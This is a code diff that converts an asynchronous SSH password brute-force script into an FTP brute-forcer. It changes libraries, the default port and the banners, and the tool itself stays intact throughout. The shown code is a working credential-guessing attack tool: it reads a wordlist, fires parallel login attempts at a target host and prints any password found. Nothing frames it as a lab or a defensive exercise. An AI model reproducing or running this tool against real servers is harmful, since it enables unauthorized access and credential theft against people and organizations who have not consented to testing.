@@ -1,12 +1,12 @@
-"""Async SSH bruteforce tool
+"""Async FTP bruteforce tool
 
 This tool performs asynchronous dictionary-based bruteforce attacks against 
-SSH servers. It supports specifying target host, port, username and wordlist.
+FTP servers. It supports specifying target host, port, username and wordlist.
 The tool utilizes asyncio for asynchronous concurrency and runs bruteforce 
 attempts in parallel for faster results.
 
 Usage:
-  ssh_bruteforcer.py [-h] [-n NAME] [-p PORT] [-u USERNAME] -w WORDLIST target
+  ftp_bruteforcer.py [-h] [-n NAME] [-p PORT] [-u USERNAME] -w WORDLIST target
 
   positional arguments:
     target                Host to attack e.g. 192.168.1.1
@@ -20,14 +20,12 @@ Usage:
                         Username which we want to bruteforce to
                           
 Example:
-  python ssh_bruteforcer.py 192.168.1.1 -u root -w passwords.txt
+  python ftp_bruteforcer.py 192.168.1.1 -u root -w passwords.txt
     
 """
-
-
 import argparse 
 from termcolor import colored,cprint 
-import asyncio, asyncssh 
+import asyncio, aioftp 
 import os
 from datetime import datetime 
 
@@ -36,7 +34,7 @@ def get_args():
     parser = argparse.ArgumentParser()
 
     parser.add_argument("-n","--name", type=str)
-    parser.add_argument("-p","--port", type=int,default=22)
+    parser.add_argument("-p","--port", type=int,default=21)
     parser.add_argument("target",
                         help="Host to attack on e.g. 192.168.1.1")
     parser.add_argument('-w', '--wordlist', dest='wordlist',
@@ -71,24 +69,25 @@ async def main(hostname, port, username, wordlist):
                 
                 if not found_flag.set():
                     tasks.append(asyncio.create_task(
-                        ssh_bruteforce(hostname, username, password, port, found_flag)))    
+                        ftp_bruteforce(hostname, username, password, port, found_flag)))    
                     
             await asyncio.sleep(0.01)
             
             counter += 1
                     
-async def ssh_bruteforce(hostname, username, password, port, found_flag):
+async def ftp_bruteforce(hostname, username, password, port, found_flag):
     try:
-        async with asyncssh.connect(hostname, username=username, password=password, port=port) as conn:
+        async with aioftp.Client.context(hostname, username=username, password=password, port=port) as client:
             found_flag.set()
             print(colored(f"[+] Password Found -> login credential: {username}:{password}@{hostname}" , "green"))
+    
     except Exception as err:
         print(
             f"[Attempt] target {hostname} - login:{username} - password:{password}")
 
 if __name__ == "__main__":
     print(colored("\nAfshin Here!!!","green"))
-    cprint("Welcome to my SSH Bruteforcer","blue")
+    cprint("Welcome to my FTP Bruteforcer","blue")
     
     arguments = get_args()
     
@@ -107,11 +106,11 @@ if __name__ == "__main__":
         colored(f"[*] Wordlist\t: ", "magenta"), end="")
     print(arguments.wordlist)
     print(colored(f"[*] Protocol\t: ", "magenta"), end="")
-    print("SSH")
+    print("FTP")
     print("--------------------------------------------------------")
     
     print(colored(
-        f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
+        f"FTP-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
     print("--------------------------------------------------------\n--------------------------------------------------------")
     asyncio.run(main(arguments.target, arguments.port,
                 arguments.username, arguments.wordlist))
